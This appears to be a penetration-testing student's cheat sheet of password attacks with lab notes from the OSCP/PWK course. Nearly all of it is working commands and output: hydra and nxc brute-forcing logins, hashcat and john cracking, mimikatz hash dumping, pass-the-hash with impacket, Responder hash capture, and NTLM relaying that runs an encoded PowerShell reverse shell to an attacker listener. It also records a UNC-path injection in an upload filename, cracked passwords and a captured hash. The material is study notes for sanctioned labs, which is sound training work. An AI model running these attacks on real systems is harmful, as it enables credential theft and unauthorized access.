# Password Attacks
## SSH
```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<IP>

ssh george@192.168.168.201 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"  -p 22
```

## RDP
```bash
#  nxc is supposed to be better than hydra for RDP
nxc rdp <ip> -u list.txt -p 'mypassword'

echo -e "daniel\njustin" | tee -a users.txt  # custom  wordlist as we find credentials
hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.50.202
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202 

# Connect with SHARE!
xfreerdp3 /u:justin  /p:"SuperS3cure1337#" /v:192.168.168.202  /drive:KALI_PWK,/home/kali/pwk +clipboard

hydra -l 'itadmin' -P rockyou.txt ftp://192.168.168.202    # PW spray FTP
itadmin:hellokitty
```
## HTTP POST Login
* Always try login with default creds first : admin:admin, check documentation
* Then try bruteforce with rockyou.txt
* HYDRA Brute Force Overview: 
	1. Capture failed login attempt in Burp
	2. Burp -> Intercept ON -> Attempt  to login
	3. Forward Request, Identify *FAILED* login attempt
	4. Use *FAILED l*ogin text for Failed login identifier in the http-post-form
* **http-post-form**
* http-post-form requires 3 COLON `:` delimited  fields
		1. location of login form *index.php*
		2. request body, user/pass *fm_usr=user&fm_pwd=^PASS^*
		3. Failed login identifier: *Login failed. Invalid*
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
## HTTP  Basic Auth
* We identify basic basic auth because won't see a POST with a user/pass variable at the bottom, just the GET
* for http basic auth, we can crack with *http-get* or *http-post*
```bash
hydra -l admin -P rockyou.txt 192.168.168.201 http-get /admin/ -V
hydra -l admin -P rockyou.txt 192.168.168.201 http-post /admin/ -V
# 80][http-post] host: 192.168.168.201   login: admin   password: 789456
```
## Password Cracking Fundamentals
* Calulate Password cracking time
* keyspace = characterset ** password length
* cracking time  = keyspace /  hashrate 
```bash
# Determine password cracking time
# 1. Calculate keyspace, total number of keys to power of characters
# i.e. if we have all lower and upper case characteers, 52, with a 8 character password
python3 -c "print(52**8)" # keyspace == 53459728531456

# Take keyspace, and divide by your calculated hash rate 
# If MD5 GPU hash rate  was : 68,185.1 MH/s
# 68,185.1 MH/s == 68185100000
# keyspace/hashrate
python3 -c "print(53459728531456 / 68185100000)"   # == ~ 784 minutes
```

## Mutating Wordlists
* Use rule functions when we need to meet password complexity requirements
* Rule functions are applied Left to Right
* General idea is to create a .rule file, that Hashcat will use when proccessing password list file, to  mutate passwords
* Default hashcat rules are @ `ls -la /usr/share/hashcat/rules/`
```bash
#  grab first 10 passwords from rock you
head /usr/share/wordlists/rockyou.txt > demo.txt

# remove all lines starting with 1
sed -i '/^1/d' demo.txt

# create rule function
echo \$1 > demo.rule

# hashcat in demo mode demonstrating rule in action, --stdout is demo/debugging
hashcat -r demo.rule --stdout demo.txt

# first character is CAPITALIZED and 1 is appended to end 
$1 c

# This will generate two separate passwords, as rules are proccessed seperately
# If starting word in file is 'password, this creates 'Password' & 'password1'
$1  
c

# If starting word in file is 'password, this creates 'Password' & 'password1'
$1 c $!  # creates Password1! 
$! $1 c  # creates Password!1

# If password policy is  requiring an upper case letter, a numerical value, and a special character.
# Create file as demo3.rule
$1 c $!
$2 c $!
$1 $2 $3 c $!


#  :	No operation (NOP)	word	Tries the word exactly as it is.
#  c	Capitalize first letter	Word	Satisfies the capital letter requirement.
# All rules are defined in the $JOHN/john.conf file. You can add a custom rule set to this file.
# 3 numbers, A cap Passwords need 3 numbers, a capital letter and a special character

# created custom rule and sent to john.conf
# ssh.rule
[List.Rules:sshPWKRules]
c $[0-9] $[0-9] $[0-9] $!
c $[0-9] $[0-9] $[0-9] $@
c $[0-9] $[0-9] $[0-9] $#
# append john.conf
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

# above  would take a password 'word' and convert it to 'Word000!' 'Word000@' 'Word000# 'Word001!' etc

# md5 hash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force   
```
## KDBX Files
```powershell
#These are KeyPassX password-stored files
cmd> dir /s /b c:\*.kdbx 
Ps> Get-ChildItem -Recurse -Filter *.kdbx

#Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=$rockyou keepasshash

# keepass2john added, 'Database' user field in front of hash.  Remove for hashcat
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# Lab #2
nxc rdp 192.168.110.227 -u 'nadine' -p "$rockyou" --ignore-pw-decoding
hydra  rdp://192.168.110.227 -l 'nadine' -P $rockyou  

192.168.110.227 3389   MARKETINGWK02    [+] marketingwk02\nadine:123abc (Pwn3d!)
cmd> dir /s /b c:\*.kdbx 


```

## SSH Private Key Passphrase
- Often found via WWW Directory Traversal 
```bash
# connect with id_rsa
chmod 600 id_rsa                 # Set permissions on our found SSH PRIV KEY
ssh -i id_rsa dave@192.168.IP -p 2222  

### Cracking SSH Priv Key passphrase
# 1. convert id_rsa hash to john format
ssh2john id_rsa > ssh.hash      

# For HASHCAT, with text editor, remove any leading filenames before $6 in file ssh.hash
# For John, the file should be g2g

# find correct -m mode to use
hashcat -h | grep -i "ssh"      
hashcat -m 22921 ssh.hash ssh.passwords  --force

### Custom Rule SET password policy
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force

# if hashcat throws an error, use john instead
john --wordlist=ssh.passwords --rules=[CUSTOM_RULE_GOES_HERE] ssh.hash

###Updating /etc/john/john.conf for custom RULE list
# 3 numbers, A cap Passwords need 3 numbers, a capital letter and a special character
# ssh.rule :  a password 'word' and convert it to 'Word000!' 'Word000@' 'Word000# 'Word001!' etc
[List.Rules:sshPWKRules]
c $[0-9] $[0-9] $[0-9] $!
c $[0-9] $[0-9] $[0-9] $@
c $[0-9] $[0-9] $[0-9] $#

# append john.conf
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'

### Create customized password list from rule set
john --wordlist=ssh.passwords --rules=sshPWKRules --stdout > chp16passwords.txt
```
## NTLM
### Cracking NTLM
- LSASS runs as system, so we need 2 specific privs to make this work
- [_SeImpersonatePrivilege_](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) 
- [_SeDebugPrivilege_](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113)
- 
```bash
#  enumerate local users
get-localuser  
net user

# start mimikatz
.\mimikatz.exe

# sekurlsa::logonpasswords  attempts to extract plaintext passwords and password hashes from all available sources.
# lsadump::sam   less noise
# SeDebugPrivilege Required for sekurlsa::logonpasswords & lsadump::sam
privilege::debug 
token::elevate   # elevate to SYSTEM user privileges.
lsadump::sam 	 # extract the NTLM hashes from the SAM

# copy the hashes out, and locate hashcat mode
hashcat --help | grep -i "ntlm"

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
john --wordlist=$rockyou --rules=best64 nelly.hash --format=NT  
```
### Pass-the-hash PtH NTLM
```bash
# Example with smbclient
smbclient \\\\192.168.110.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
dir
get secrets.txt

# SYSTEM shell    0000000 bit is for the LM hash, which is empty
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.110.212
hostname
ipconfig
whoami
exit

# Shell as Admin user NOT system
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.110.212
whoami
```
## Cracking Net-NTLMv2
- Net-NTLMv2 is less secure than kerberos, so we can crack
- We have access, but no privs, no passwd, and can't run mimikatz
- Force Windows machine to connect to KALI, and capture hash with resonder
```powershell
nc 192.168.50.211 4444          # connect to victim via our bind shell
sudo responder -I tap0          # start responder on Kali
dir \\192.168.119.2\test        # initiate connection from WIN -> KALI
hashcat --help | grep -i "ntlm" 
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force  # profit!
```
## Relaying Net-NTLMv2
- If NTLMv2 Password can't be cracked, we can relay
- Both systems need to contain the LOCAL user account
- If UAC Remote Restrictions are enabled, then only LOCAL admin account works
- We use BOX1, to send Net-NTLMv2 hash to Kali, with fowards/relays it to BOX2, authenticating with the Net-NTLMv2 hash, thus providing us a shell on BOX2
- BOX1 -> KALI -> BOX2 -> Shell back to KALI
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.IP -c "powershell -enc JABjAGdA..."
#  powershell 1-liner  base64-encode and execute with the -enc argument
# --no-http-server to disable the HTTP server 
# -smb2support to add support for SMB2, since we are relaying an SMB connection and 

nc -nvlp 8080 
nc 192.168.50.211 5555  # Connect to Bind on BOX1
dir \\192.168.119.2\test  # Force Authentication to KALI, sending the NTLMv2 to impacket-ntlmrelayx
```

## Windows Credential Guard

- Domain hashes stored in memory of LSASS.exe process
```powershell
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

- With Credential Guard enabled, hashes are now in VTL1, not in memory
- Mimikats can register a new SSP with the SSPI, and hopefully force the SSPI to use our SSP for authentiction, forcing it to call the SSP with plaintext creds, which we can intercept
- once injected, wait for a connection, or force a connection
```powershell
privilege::debug
misc::memssp
# saved in a log file, C:\Windows\System32\mimilsa.log
```

# LAB
**16.3.3 Q1**  192.168.205.211  <> KALI IP : 192.168.45.207  
- Follow the steps outlined in this section to obtain the Net-NTLMv2 hash in Responder. Crack it and use it to connect to VM #1 (FILES01) with RDP. 
- Find the flag on _paul_'s desktop. Attention: If the bind shell is terminated it may take up to 1 minute until it is accessible again.
There's a bind shell running on the IP : **192.168.205.211**, connecting with nc 192.168.205.211 4444
We connect back to our KALI box with a simple dir command `dir \\kaliIP\test`
In responder we now see the hash!!
```
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[SMB] NTLMv2-SSP Client   : 192.168.205.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:e6fe1efd7579d49c:86872916BE78419CB83C115BF9AD1C36:010100000000000000FC86EB3041DC0139C1D8FDC98BD7830000000002000800480031003000580001001E00570049004E002D0034004200430038004700570034004B0031005600430004003400570049004E002D0034004200430038004700570034004B003100560043002E0048003100300058002E004C004F00430041004C000300140048003100300058002E004C004F00430041004C000500140048003100300058002E004C004F00430041004C000700080000FC86EB3041DC0106000400020000000800300030000000000000000000000000200000F204990C0A92901E116DE23081DD59C2E01051D51B0B04A7EF4C9F75D690E8DF0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300037000000000000000000
```

CRACK THIS!
`hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`
`hashcat -m 5600 paul.hash ~/wordlists/rockyou.txt --force`
Found it : 123Password123

---
**16.3.3 Q2**   **192.168.205.210** <> KALI IP : 192.168.45.207  
NMAP showing web server on port  8000
Browsing there shows an upload file option.
Uploaded simple.png
Was able to browse to it via : http://marketingwk01:8000/simple.png
Lets try to upload something else

Ok this was simple..
In the post request for our simple upload.. we can modify the following : 
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.207\\test"
This provided the hash in responder

![[1633-Q2.png]]

Password is : sam:DISISMYPASSWORD

**192.168.205.210**
RDP with remmina

---
16.3.4 Q1      
Server01 = 192.168.50.211
Server02 = 192.168.50.212

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.205.212 -c "powershell -e JABApAA=="

Connect to bind shell on Server01: nc 192.168.205.211 5555
We initiate a connection from Server01, to our Kali fake SMB share : dir \\kali\test 
NTLMrelayx on KALI, then sends the captured NTLMv2 hash to server 2, with our powershell encoded command.
This ONLY works if the hash we captured is a Local Admin on server02

---
16.3.4 Q2
Server03: 192.168.205.202
Server04: 192.168.205.212

Start VM Group 2 and find a way to obtain a Net-NTLMv2 hash from the _anastasia_ user via the web application on VM #3 (BRUTE2) and relay it to VM #4 (FILES02).
The flag is on _anastasia_'s Desktop.

Nmap open
8000/tcp open  http        syn-ack ttl 125 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

whatweb -v http://192.168.205.202:8000   jquery, java,

gobuster dir -u http://192.168.205.202/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
/archive              (Status: 200) [Size: 58]

Website  http://192.168.205.202:8000   , has a box that indicates it provides input to powershell terminal.
Request: whoami  
response: Repository successfully cloned with command: whoami and output: brute2\anastasia

Start relay on kali:  `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.205.212 -c "powershell -e JABApAA=="  `
Start NCAT listener on kali: `  rlwrap ncat -nvlp 8080  `

sent gci \\192.168.45.207\testme   :   Success!!!
